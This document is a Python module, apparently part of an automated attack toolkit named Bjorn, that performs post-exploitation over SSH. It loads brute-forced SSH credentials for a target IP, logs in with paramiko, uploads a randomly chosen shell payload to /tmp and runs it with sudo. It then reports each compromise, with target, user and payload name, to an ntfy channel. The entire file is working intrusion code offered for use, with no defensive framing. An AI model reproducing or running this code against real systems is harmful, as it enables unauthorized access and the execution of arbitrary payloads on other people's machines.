# zombify_ssh.py
# SSH Zombie module — connect, pick random payload, upload, run, disconnect

import os
import glob
import random
import csv
import socket
import paramiko
import logging
from rich.console import Console
from logger import Logger
from ntfy import send_ntfy

logger = Logger(name="zombify_ssh.py", level=logging.DEBUG)
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

b_class  = "ZombifySSH"
b_module = "zombify_ssh"
b_status = "zombify_ssh"
b_parent = "SSHBruteforce"
b_port   = 22

PAYLOAD_DIR = "/home/bjorn/Bjorn/payloads/"


class ZombifySSH:
    def __init__(self, shared_data):
        self.shared_data     = shared_data
        self.console         = Console()
        self.b_parent        = b_parent
        self.b_port          = b_port
        self.b_class         = b_class
        self.b_module        = b_module
        self.b_status        = b_status
        logger.info("Zombify SSH initialized")

    def _get_local_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        except Exception:
            return "0.0.0.0"
        finally:
            s.close()

    def _pick_payload(self):
        """Pick a random .sh payload — excludes anything with 'ssh' in the name."""
        if not os.path.isdir(PAYLOAD_DIR):
            logger.error(f"Payload directory not found: {PAYLOAD_DIR}")
            return None

        all_payloads = glob.glob(os.path.join(PAYLOAD_DIR, "*.sh"))
        eligible = [
            f for f in all_payloads
            if "ssh" not in os.path.basename(f).lower()
            and os.path.getsize(f) > 0
        ]

        if not eligible:
            logger.error("No eligible payloads found (non-SSH, non-empty)")
            return None

        chosen = random.choice(eligible)
        logger.info(f"Selected payload: {os.path.basename(chosen)}")
        return chosen

    def _load_credentials(self, ip):
        """Load cracked SSH credentials for this IP from the results CSV."""
        credentials = []
        sshfile = self.shared_data.sshfile

        if not os.path.exists(sshfile):
            logger.error(f"SSH credentials file not found: {sshfile}")
            return credentials

        try:
            with open(sshfile, 'r') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    if row.get('IP Address', '').strip() == ip:
                        user = row.get('User',     '').strip()
                        pwd  = row.get('Password', '').strip()
                        if user and pwd:
                            credentials.append((user, pwd))
        except Exception as e:
            logger.error(f"Error reading credentials file: {e}")

        return credentials

    def execute(self, ip, port, row, status_key):
        hostname = socket.gethostname()
        local_ip = self._get_local_ip()

        try:
            # Gate: parent must have succeeded
            if 'success' not in row.get(self.b_parent, ''):
                logger.error(f"Parent {self.b_parent} not successful for {ip} — skipping.")
                return 'failed'

            logger.info(f"Running ZombifySSH on {ip}:{port}")
            send_ntfy(f"ZombifySSH: Starting on {ip} from {hostname} ({local_ip})")

            credentials = self._load_credentials(ip)
            if not credentials:
                logger.error(f"No credentials found for {ip}")
                return 'failed'

            local_payload = self._pick_payload()
            if not local_payload:
                return 'failed'

            payload_name = os.path.basename(local_payload)
            remote_path  = f"/tmp/{payload_name}"

            for username, password in credentials:
                ssh = None
                try:
                    logger.info(f"Trying {username}:{password} on {ip}")

                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(
                        ip,
                        username=username,
                        password=password,
                        timeout=10,
                        banner_timeout=15,
                        auth_timeout=10,
                    )

                    # Verify payload exists and has content before uploading
                    if not os.path.exists(local_payload):
                        logger.error(f"Payload file missing: {local_payload}")
                        ssh.close()
                        return 'failed'
                    if os.path.getsize(local_payload) == 0:
                        logger.error(f"Payload file is empty: {local_payload}")
                        ssh.close()
                        return 'failed'

                    # Upload
                    sftp = ssh.open_sftp()
                    sftp.put(local_payload, remote_path)
                    sftp.close()
                    logger.info(f"Uploaded {local_payload} → {remote_path}")

                    # Execute
                    command = f"chmod +x {remote_path} && sudo {remote_path}"
                    stdin, stdout, stderr = ssh.exec_command(command, timeout=30)
                    out = stdout.read().decode(errors='ignore').strip()
                    err = stderr.read().decode(errors='ignore').strip()

                    if out:
                        logger.info(f"stdout: {out[:300]}")
                    if err:
                        logger.warning(f"stderr: {err[:300]}")

                    ssh.close()

                    logger.info(f"ZombifySSH succeeded on {ip} — payload: {payload_name}")
                    send_ntfy(
                        f"ZombifySSH SUCCESS\n"
                        f"target:  {ip}\n"
                        f"user:    {username}\n"
                        f"payload: {payload_name}\n"
                        f"from:    {hostname} ({local_ip})"
                    )
                    return 'success'

                except Exception as e:
                    logger.error(f"SSH error on {ip} with {username}: {e}")
                    if ssh:
                        try:
                            ssh.close()
                        except Exception:
                            pass

            logger.error(f"All credentials failed for {ip}")
            return 'failed'

        except Exception as e:
            logger.error(f"Unexpected error in ZombifySSH: {e}")
            return 'failed'